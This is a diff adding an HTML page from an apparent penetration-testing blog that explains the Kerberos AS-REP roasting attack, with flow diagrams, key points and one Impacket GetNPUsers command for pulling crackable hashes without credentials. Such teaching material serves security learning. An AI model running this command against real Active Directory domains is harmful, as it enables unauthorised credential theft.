@@ -1,0 +1,1600 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <meta name="generator" content="Hugo 0.138.0">
+
+    <script src="js/custom.js"></script>
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Bones &amp; All Cyber Security" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            Understanding AS-REP Roasting Attacks: A Deep Dive |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
+                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
+                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
+                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            Understanding AS-REP Roasting Attacks: A Deep Dive -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir opened-dir"
+                    >
+                    <span class="dir-text"> Articles </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingasreproasting/" title="./articles/understandingasreproasting/">
+                        
+                            Understanding AS-REP Roasting Attacks: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingdownloadcradles/" title="./articles/understandingdownloadcradles/">
+                        
+                            Understanding PowerShell Download Cradles: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understanding2023-28252-clfs/" title="./articles/understanding2023-28252-clfs/">
+                        
+                            Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingthemebleedcve-2023-38146/" title="./articles/understandingthemebleedcve-2023-38146/">
+                        
+                            Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingcupsexploitation/" title="./articles/understandingcupsexploitation/">
+                        
+                            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
+                        
+                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
+                        
+                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
+                        
+                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
+                        
+                            Understanding the Shadow Credentials Attack Vector
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
+                        
+                            Understanding .NET Deserialization Exploits: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Tools </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
+                        
+                            LDAPire: LDAP Enumeration Tool
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/automatingqemukalivm/" title="./tools/automatingqemukalivm/">
+                        
+                            Automating Kali VM Setup with QEMU
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
+                        
+                            BloodServer: A Secure File Transfer Tool for Penetration Testers
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/driver-box/" title="./walkthroughs/driver-box/">
+                        
+                            Driver HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/timelapse-box/" title="./walkthroughs/timelapse-box/">
+                        
+                            Timelapse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/certified-box/" title="./walkthroughs/certified-box/">
+                        
+                            Certified HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/aero-box/" title="./walkthroughs/aero-box/">
+                        
+                            Aero HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/administrator-box/" title="./walkthroughs/administrator-box/">
+                        
+                            Administrator HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/sauna-box/" title="./walkthroughs/sauna-box/">
+                        
+                            Sauna HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/active-box/" title="./walkthroughs/active-box/">
+                        
+                            Active HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cicada-box/" title="./walkthroughs/cicada-box/">
+                        
+                            Cicada HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/authority-box/" title="./walkthroughs/authority-box/">
+                        
+                            Authority HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/evilcups-box/" title="./walkthroughs/evilcups-box/">
+                        
+                            EvilCUPS HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
+                        
+                            Resolute HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
+                        
+                            Fuse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
+                        
+                            Cascade HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
+                        
+                            Monteverde HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
+                        
+                            Outdated HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
+                        
+                            Scrambled HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
+                        
+                            Escape HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Cheatsheets </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
+                        
+                            Attacking LDAP: Deep Dive &amp; Cheatsheet
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
+                        
+                            Attacking RPC: Deep Dive &amp; Cheat Sheet
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                Understanding AS-REP Roasting Attacks: A Deep Dive
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="2024.15.11"
+                            >2024.15.11
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        6 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+                <div class="tags">
+                    <i
+                        class="bi bi-tags"
+                        title="Tags"></i>
+                    
+                        <a
+                            href="/tags/windows/"
+                            class="tag-btn">
+                            Windows
+                        </a>
+                    
+                        <a
+                            href="/tags/active-directory/"
+                            class="tag-btn">
+                            Active Directory
+                        </a>
+                    
+                        <a
+                            href="/tags/asreproasting/"
+                            class="tag-btn">
+                            ASREPRoasting
+                        </a>
+                    
+                        <a
+                            href="/tags/kereros/"
+                            class="tag-btn">
+                            Kereros
+                        </a>
+                    
+                </div>
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/articles/" class="bread-btn">
+    
+
+    
+        Articles
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/articles/understandingasreproasting/" class="bread-btn">
+    
+
+    
+        
+            Understanding AS-REP Roasting Attacks: A Deep Dive
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#understanding-as-rep-roasting">Understanding AS-REP Roasting:</a>
+      <ul>
+        <li><a href="#general-overview-and-attack-flow">General Overview and Attack Flow:</a></li>
+        <li><a href="#pre-authentication-process">Pre-Authentication Process:</a></li>
+        <li><a href="#without-pre-authentication-how-asreproasting-works">Without Pre-Authentication (how ASREPRoasting works):</a></li>
+        <li><a href="#detection-and-defense">Detection and Defense:</a></li>
+      </ul>
+    </li>
+    <li><a href="#enumeration-tools">AS-REP-Roasting Enumeration Tools:</a>
+      <ul>
+        <li><a href="#using-powerview-to-enumerate-users-susceptible-to-as-rep-roasting">Using PowerView to Enumerate users susceptible to AS-REP Roasting:</a></li>
+        <li><a href="#using-powershell-to-enumerate-users-susceptible-to-as-rep-roasting">Using PowerShell to Enumerate users susceptible to AS-REP Roasting:</a></li>
+        <li><a href="#using-powershell-amp-ad-module-to-enumerate-users-susceptible-to-as-rep-roasting">Using PowerShell &amp; AD Module to Enumerate users susceptible to AS-REP Roasting:</a></li>
+      </ul>
+    </li>
+    <li><a href="#as-rep-roasting-tools">AS-REP Roasting +Attack+ Tools:</a>
+      <ul>
+        <li><a href="#using-impacket-getnpusers-for-as-rep-roasting-attack">Using Impacket-GetNPUsers for AS-REP Roasting Attack:</a></li>
+        <li><a href="#using-rubeus-for-as-rep-roasting-attack">Using Rubeus for AS-REP Roasting Attack:</a></li>
+        <li><a href="#using-netexec-for-as-rep-roasting-attack">Using Netexec for AS-REP Roasting Attack:</a></li>
+        <li><a href="#targeted-as-reproasting-attack">Targeted AS-REPRoasting Attack:</a></li>
+        <li><a href="#comparison-with-other-attack-techniques">Comparison with Other Attack Techniques:</a></li>
+        <li><a href="#practice-on-hack-the-box">Practice AS-REP Roasting on Hack The Box</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="understanding-as-rep-roasting">Understanding AS-REP Roasting:</h2>
+<h3 id="general-overview-and-attack-flow">General Overview and Attack Flow:</h3>
+<ul>
+<li>ASREPRoasting is an attack against <strong>Kerberos</strong> authentication where an attacker requests an <strong>AS-REP</strong> (Authentication Service Response) for user accounts that have the <code>&quot;Do not require Kerberos preauthentication&quot;</code> setting enabled
+<ul>
+<li>The attacker can then attempt to crack the encrypted <strong>TGT</strong> (Ticket-Granting Ticket) offline to obtain plaintext credentials</li>
+</ul>
+</li>
+<li>ASREPRoasting is similar to <strong>Kerberoasting</strong> but targets <code>AS-REP</code> instead of <code>TGS-REP</code> (Ticket-Granting Service Response)</li>
+</ul>
+<h4 id="attack-process">Attack Process</h4>
+<ul>
+<li>Attacker enumerates users with the &ldquo;Do not require Kerberos preauthentication&rdquo; setting
+<ul>
+<li>Some vendor installation guides require service accounts with <code>DONT_REQ_PREAUTH</code> disabled, making these accounts vulnerable</li>
+<li>These accounts are less frequently used than Service Principal Names (SPNs), which are more commonly targeted in Kerberoasting attacks</li>
+</ul>
+</li>
+<li>Requests an AS-REP from the <strong>Key Distribution Center (KDC)</strong></li>
+<li>Cracks the encrypted TGT offline to retrieve plaintext credentials</li>
+</ul>
+<h4 id="attack-flow-diagram">Attack Flow Diagram</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20%20%20[Attacker]%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20[Domain%20Controller/KDC]%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20[Target%20User]%0a%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%201.%20AS-REQ%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%20%28without%20Pre-Authentication%29%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c-------------------------------------%e2%86%92%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%202.%20Checks%20if%20DONT_REQ_PREAUTH%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20is%20set%20for%20requested%20user%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%203.%20AS-REP%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%20%28contains%20encrypted%20TGT%29%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%e2%86%90-------------------------------------%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%204.%20Offline%20Password%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%20%20Cracking%20Attempt%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20[Success%20=%20Compromised%20Credentials]%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>    [Attacker]                         [Domain Controller/KDC]                [Target User]
+</span></span><span style="display:flex;"><span>        |                                       |                                 |
+</span></span><span style="display:flex;"><span>        |   1. AS-REQ                           |                                 |
+</span></span><span style="display:flex;"><span>        |   (without Pre-Authentication)        |                                 |
+</span></span><span style="display:flex;"><span>        |-------------------------------------→ |                                 |
+</span></span><span style="display:flex;"><span>        |                                       |                                 |
+</span></span><span style="display:flex;"><span>        |                                       | 2. Checks if DONT_REQ_PREAUTH   |
+</span></span><span style="display:flex;"><span>        |                                       | is set for requested user       |
+</span></span><span style="display:flex;"><span>        |                                       |                                 |
+</span></span><span style="display:flex;"><span>        |   3. AS-REP                           |                                 |
+</span></span><span style="display:flex;"><span>        |   (contains encrypted TGT)            |                                 |
+</span></span><span style="display:flex;"><span>        | ←-------------------------------------|                                 |
+</span></span><span style="display:flex;"><span>        |                                       |                                 |
+</span></span><span style="display:flex;"><span>        | 4. Offline Password                   |                                 |
+</span></span><span style="display:flex;"><span>        |    Cracking Attempt                   |                                 |
+</span></span><span style="display:flex;"><span>        |                                       |                                 |
+</span></span><span style="display:flex;"><span>        |                                       |                                 |
+</span></span><span style="display:flex;"><span>    [Success = Compromised Credentials]         |                                 |</span></span></code></pre></div>
+    
+</div>
+<p>+Key Points+:</p>
+<ul>
+<li>No interaction with target user required</li>
+<li>No failed login attempts generated</li>
+<li>Encryption uses user&rsquo;s password hash</li>
+<li>Can be performed without domain credentials
+<ul>
+<li>+For example+: we can run impacket-GetNPUsers without any authentication and retrieve the TGT.
+<ul>
+<li><code>impacket-GetNPUsers $domain/ -request</code> (more on tools later)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="pre-authentication-process">Pre-Authentication Process:</h3>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>Normal Pre-Authentication:</p>
+<ul>
+<li>Encryption key for <strong>AS-REQ</strong> (Authentication Server Request) is a timestamp encrypted with the user&rsquo;s password hash</li>
+<li>If the <strong>AS-REP</strong> timestamp is within a few minutes of the KDC&rsquo;s time, the KDC will issue the <strong>TGT</strong> via AS-REP</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20%20%20[Client]%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20[KDC]%0a%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%201.%20AS-REQ%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%28Encrypted%20Timestamp%29%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c--------------------------------%3e%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%202.%20Decrypt%20&amp;%20Verify%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Timestamp%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%203.%20AS-REP%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%28TGT%20if%20timestamp%20valid%29%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%3c--------------------------------%7c%0a%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
